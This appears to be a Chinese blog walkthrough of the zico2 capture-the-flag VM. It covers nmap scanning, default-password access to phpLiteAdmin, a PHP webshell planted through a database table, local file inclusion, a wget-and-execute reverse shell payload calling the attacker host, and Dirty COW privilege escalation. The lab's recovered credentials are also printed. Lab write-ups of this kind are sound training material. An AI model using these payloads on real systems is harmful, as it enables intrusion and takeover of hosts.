环境搭建

一开始看的博客是然桥接连接，然后我用的kali2020，反复鼓捣了几天后，也解决不了kali桥接无法上网，即==不分配ip地址，只有mac地址==的问题，于是我采用了NAT连接的方法。

前期准备

由于NAT连接是共享主机的IP，所以，我们先需要查看主机ip，在Windows下的cmd下输入ipconfig，可以看到，具体的网段地址。

可以看到IPV4的地址为 192.168.1.245,于是打开虚拟网路编辑器

将DHCP修改到同一个网段，以保证能够相互ping通

如果不做这一步操作，可能会无法ping通，未改动之前默认的DHCP网段是192.168.159.0，在kali里ifconfig查看后进行了改动。

查看kali现在的ip

好了，保持在同一个网段了，现在开始吧！打卡zico2靶机。

靶机地址，大家可以在网上搜一下，这里就不放出来了。

信息搜集

使用nmap对整个192.168.1.0网段进行扫描，发现存活的主机

别的博客里还说，，netdiscover也能扫描到，但是我的kali2020，又是什么都没扫到，，

nmap -sP XXXXX 是对整个c段网络进行了扫描 仅对主机进行ping扫描

nmap -O xxxx 对目标进行指纹识别

可以看到很详细的数据，同时开放了80,22,111端口

nmap -F xxx 探测常用端口是否开启

nmap -sV -T4 -p 111,80,52448,22 xxx 大佬博客里用的是这样的 命令 –T指的是时序，也可以说优先级

目录扫描

使用御剑扫描

扫到了dbadmin,应该是数据库后台、

还有一种是用 dirb扫描目录，结果，都能发现 dbadmin

访问test_ad.php,发现使用了phpliteAdmin

这种服务一般都有初始密码，就像用phpstudy搭建的mysql，默认用户名和密码都是 root,百度搜索一波

好的，密码是admin，输入后，进入后台

浏览后台页面，找到用户表，套取里面的信息

这里补充一下，一般数据库的加密方式都是MD5，因为其不可逆，所以需要撞库，进行暴力破解，可以找在线MD5在线破解，国内的收费，这里推荐免费的

因为上面知道了开放了22端口，所以采用ssh登录，发现root没有权限，应该是禁止登录了

试试普通用户zico

zico 密码解密后是zico2215@，使用ssh登录，发现还是没有权限

ssh登录无果，尝试代码注入

当时想的是，直接把一句话木马 into outfile,后来发现命令执行不了，

然后就像，他既然报错，哪应该会有日志文件吧，但，，我却没有百度到。

然后创建数据库，发现既然可以以php结尾，加上它本身就有的php环境，那么，创建一个表，把一句话木马的字段放进去，尝试多次后，发现插入的字段，以 text为好

还记得那个大明湖畔的文件包含漏洞吗？现在到了宠幸他的时候

用文件包含漏洞和../来判断具体的文件路径，以便连接我们的一句话木马。

但是蚁剑连接获取root权限好像还缺点什么？

no tty present and no askpass program 这个原因我也查了一下

是由于账号没有开启免密码导致的

具体更改规则如下

假设当前账号为:abc

  1. 切换到root下，打开sudoers :vim /etc/sudoers
  2. 添加免密码，abc ALL = NOPASSWD : ALL
  3. 保存的时候可能会提示readonly，需要 wq!才能保存 ，当然也可以chmod 777 直接赋予他所有权限

但是咱们肯定没有办法用正常渠道进行修改的对吧，另辟路径吧

提权

linux下，比较出名的应该是脏牛提权

先使用 uname -a 进行一下版本的检测，确定是否能使用

发现可以使用，

接下来，给他上传 dirtycow.c文件，给他上传到/tmp目录下

经过一番操作后，发现，行不通，，，su命令只有终端才能执行

那没事了，还得想办法获取正常的弹反shell, 蚁剑只能到此结束。

获取shell

在kali下的/var/www/html下编写php一句话反弹shell,命名为shell.txt

然后开启apache2服务

接下来在数据库中上传脚本并执行

在创建的数据库中insert数据

<?php system("wget 192.168.1.128/shell.txt" -O /tmp/shell.php; php /tmp/shell.php)>

先在kali上开启监听端口

nc -lvp 1234

然后再用文件包含漏洞进行访问

http://192.168.1.131/view.php?page=../../usr/databases/test，便可发现

反弹shell成功

接下来开始正式的脏牛提权

老办法，先用蚁剑把dirty.c上传到/tmp 目录下，然后开始反弹shell

gcc -pthread dirty.c -o dirty -lcrypt

然后执行./dirty，等待exp完成(时间稍长，耐心等待)

然后我们用python脚本转换为交互式的tty模式

成功转为tty模式

之所以要转tty是因为脏牛提权后，需要再terminal才能切换身份

至此，提权成功

wp-config.php 文件是WordPress数据库的关键。数据库名、用户名、密码、位置都是在此设置。

获取到用户名：==zico==，密码：==sWfCsfJSPV9H3AmQzw8==；

之后可也可以用ssh登录这个用户
